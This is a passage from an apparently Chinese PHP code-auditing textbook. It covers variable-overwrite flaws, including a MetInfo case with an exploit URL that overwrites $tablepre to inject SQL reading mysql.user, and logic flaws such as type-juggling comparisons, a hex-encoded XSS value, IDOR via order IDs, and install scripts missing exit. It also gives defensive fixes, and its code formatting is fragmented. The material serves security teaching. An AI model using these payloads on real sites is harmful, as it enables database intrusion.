；
import_request_variables
（
'GP'
）；
print_r
（
$b
）；？
>
从测试结果我们可以看到变量$b的值1被覆盖成了2，如图6-3所示。
图 6-3
6.1.1.2 $$变量覆盖
曾经有一段很经典的$$注册变量导致变量覆盖的代码，在很多应用上面都出现过这个问题，这段代码如下：
foreach
（
array
（
'_COOKIE'
，
'_POST'
，
'_GET'
）
as $_request
）
{
    foreach
（
$$_request as $_key => $_value
）
{
        $$_key = addslashes
（
$_value
）；
    }
}
为什么它会导致变量覆盖呢，重点在$$符号，从代码中我们可以看出$_key为COOKIE、POST、GET中的参数，比如提交？a=1，则$key的值为a，而还有一个$在a的前面，结合起来则是$a=addslashes（$_value）；所以这样会覆盖已有的变量$a的值，我们用代码来解释会更清楚，代码如下：
 $_value
）
{
        echo $_key.''
；
        $$_key = addslashes
（
$_value
）；
    }
}
echo $a
；？
>
这段代码的执行结果如图6-4所示。从执行结果可以看出我们成功把变量$a的值覆盖成了“2”。
图 6-4
6.1.1.3 Metinfo变量覆盖漏洞分析
由于之前笔者挖到的这类漏洞没有记录，所以这里的案例是笔者临时看了一下metinfo的代码找的，我们尝试用它的变量覆盖漏洞进行SQL注入，在metinfo的include/common.inc.php文件中代码如下：
dbconn
（
$con_db_host
，
$con_db_id
，
$con_db_pass
，
$con_db_name
）；
define
（
'MAGIC_QUOTES_GPC'
，
get_magic_quotes_gpc
（））；
isset
（
$_REQUEST['GLOBALS']
）
&& exit
（
'Access Error'
）；
require_once ROOTPATH.'include/global.func.php'
；
foreach
（
array
（
'_COOKIE'
，
'_POST'
，
'_GET'
）
as $_request
）
{  foreach
（
$$_request as $_key => $_value
）
{           $_key{0}
！
= '_' && $$_key = daddslashes
（
$_value
）；
  }
}
$query="select * from {$tablepre}config where name='met_tablename' and lang='metinfo'"
；
$mettable=$db->get_one
（
$query
）；
$mettables=explode
（
'|'
，
$mettable[value]
）；
foreach
（
$mettables as $key=>$val
）
{  $tablename='met_'.$val
；
        $$tablename=$tablepre.$val
；
}
变量覆盖核心的代码如下：
foreach
（
array
（
'_COOKIE'
，
'_POST'
，
'_GET'
）
as $_request
）
{
    foreach
（
$$_request as $_key => $_value
）
{
           $_key{0}
！
= '_' && $$_key = daddslashes
（
$_value
）；
       }
}
这就是上面我们据介绍过的$$变量覆盖的经典代码，在这段代码之前的变量，我们都可以覆盖掉，包括数据库配置，这样就能搭建远程数据库服务以登录后台，不过我们只是为了说明这个漏洞，所以不搞那么复杂，可以看到下面有一个SQL语句中使用了$tablepre变量：
$query="select * from {$tablepre}config where name='met_tablename' and lang='metinfo'"
；
这里我们只要覆盖这个变量即可进行SQL注入。举例一个exp为：
/include/common.inc.php
？
tablepre=mysql.user limit 1 %23
则执行的SQL语句为：
select * from mysql.user limit 1 #config where name='met_tablename' and lang='metinfo'
我们在以上代码的最后加上：
echo $tablepre.''
；
print_r
（
$mettable
）；
exit
（）；
输出的执行结果已确认覆盖掉并且注入了SQL语句，请求结果证实确实成功利用，如图6-5所示。
图 6-5
6.1.2 漏洞防范
变量覆盖漏洞最常见漏洞点是在做变量注册时没有验证变量是否存在，以及在赋值给变量的时候，所以我们推荐使用原始的变量数组，如$_GET、$_POST，或者在注册变量前一定要验证变量是否存在。
6.1.2.1 使用原始变量
以上我们说的变量覆盖漏洞都是因为在进行变量注册而导致，所以要解决变量覆盖的问题，最直接的方法就是不进行变量注册，建议直接用原生的$_GET、$_POST等数组变量进行操作，如果考虑程序可读性等原因，需要注册个别变量，可以直接在代码中定义变量，然后再把请求中的值赋值给它。
6.1.2.2 验证变量存在
如果一定要使用前面几种方式注册变量，为了解决变量覆盖的问题，可以在注册变量前先判断变量是否存在，如使用extract（）函数则可以配置第二个参数为EXTR_SKIP。使用parse_str（）函数注册变量前需要先自行通过代码判断变量是否存在。笔者不建议使用import_request_variables（）函数注册全局变量，会导致变量不可控。最重要的一点，自行申明的变量一定要初始化，不然即使注册变量代码在执行流程最前面也能覆盖掉这些未初始化的变量。
6.2 逻辑处理漏洞
广义上来说，大多数的漏洞都是由于程序的逻辑失误导致的，都可以叫做逻辑漏洞，但我们这里说的逻辑漏洞没有那么大范围，这里指程序在业务逻辑上面的漏洞，业务逻辑漏洞也是一个不小的范围，在不同的业务场景有不同的漏洞出现，目前逻辑漏洞是各大企业存在最多的漏洞之一，因为逻辑漏洞在挖掘和利用时都需要进行一些逻辑判断，机器代码很难模拟这块的逻辑处理，所以无法用机器批量化扫描检测，检测的少了，现存的漏洞自然就多了。下面我们从代码层逻辑错误导致的漏洞开始分析，再到应用业务层常见漏洞分析，如支付、找回密码、程序安装等。
6.2.1 挖掘经验
由于业务逻辑漏洞大多都存在逻辑处理以及业务流程中，没有特别明显的关键字可以用来快速定位，通常这类漏洞的挖掘技巧是通读功能点源码，先熟悉这套程序的业务流程，后面挖掘起来就会比较顺畅，值得关注的点是程序是否可重复安装、修改密码处是否可越权修改其他用户密码、找回密码验证码是否可暴力破解以及修改其他用户密码、cookie是否可预测或者说cookie验证是否可绕过等等。
6.2.1.1 等于与存在判断绕过
在逻辑漏洞里，判断函数是非常典型的一个例子，明明学校老师教的，还有官方手册里面写的，都说某某函数在某某情况下会返回true，另外一种情况下会返回false，但是一旦这些函数存在漏洞，可以逃逸这个判断函数，那这个逻辑就可以绕过了，下面我们来看看有哪些常见又有漏洞的判断函数。
1.in_array函数
in_array（）函数是用来判断一个值是否在某一个数组列表里面，通常的判断方式如下：
in_array
（
'b'
，
array
（
'a'
，
'b'
，
'c'
））
这样是没有什么问题的，我们再看下面这段代码：
alert（1）”的hex编码“0x3c7363726970743e616c6572742831293c2f73636970743e”时，最终SQL语句的效果等同于：
insert into xx values
（
'xx'
，
'alert
（
1
）
'
）
如果应用程序有其他地方调用这个值，并且直接输出，则有可能执行这段代码，触发XSS漏洞。
3.双等于和三等于
PHP的双等于（==）和三等于（===）的区别，哪一个可能出现安全问题？这个问题是我经常在面试的时候提到，它们的区别在于，双等于在判断等于之前会先做变量类型转换，而三等于则不会，由于数据类型被改变，所以双等于在判断的时候可能存在安全风险，下面我们用代码来证明一下，代码如下：
<
？
php
var_dump
（
$_GET['var']==2
）；
当我们请求/1.php？var=2aaa时，如图6-7所示。
图 6-7
输出结果为true，请求/1.php？var=3aaa时输出结果为false，说明判断之前成功完成了变量类型转换，这里跟上面我们说的in_array（）函数是一样的道理。
我们再来测试三等于（===），代码如下：
<
？
php
var_dump
（
$_GET['var']===2
）；
当我们再次提交/1.php？var=2aaa时，此时返回为false，说明这里没有进行类型转换，如图6-8所示。
图 6-8
6.2.1.2 账户体系中的越权漏洞
越权漏洞分为水平越权和垂直越权，水平越权指原相同等级权限的用户，A用户可以查看或操作到B用户的私有信息，而这个查看或操作权限本来是A用户不该拥有的权限。垂直权限指不在同权限等级的用户，低权限等级的用户A可以查看或操作高权限等级B的私有信息，而这个查看或操作权限本来是A用户不该拥有的权限。
水平越权和垂直越权的定义不一样，但漏洞原理是一样的，都是账户体系上在判断权限时不严格导致存在绕过漏洞，这一类的绕过通常发生在cookie验证不严、简单判断用户提交的参数，归根结底，都是因为这些参数是在客户端提交，服务器端未严格校验。举个简单的例子，当前A用户查看自己详细订单的URL为/1.php？orderid=111，当用户手动提交/1.php？orderid=112时，则可以看到订单id为112的订单详细情况。这里的逻辑比较简单，不再使用代码进行讲解分析。
6.2.1.3 未exit或return引发的安全问题
某些情况下，在经过if条件判断之后，有两种操作，一种是继续执行if后面的代码，另外一种是在if体内退出当前操作，但是这个退出行为，有不少程序忘记写return、die（）或者exit（），导致程序还是会继续执行。我们来看一个举例，代码如下：
<
？
php
if
（
file_exists
（
'install.lock'
）））
{
      //
程序已经安装，跳转到首页
      header
（
"Location
：
../"
）；
}
//
…进入安装流程
很多程序的安装页面install.php文件的内容都有这么一段判断程序是否已经安装的代码，这段代码的意思是，判断“install.lock”文件是否存在，如果存在则跳转到首页，问题出在使用了header（）函数跳转，但是PHP程序并没有退出，还是会进入安装流程。我们把代码改一下来测试这个header（）函数，代码如下所示：
<
？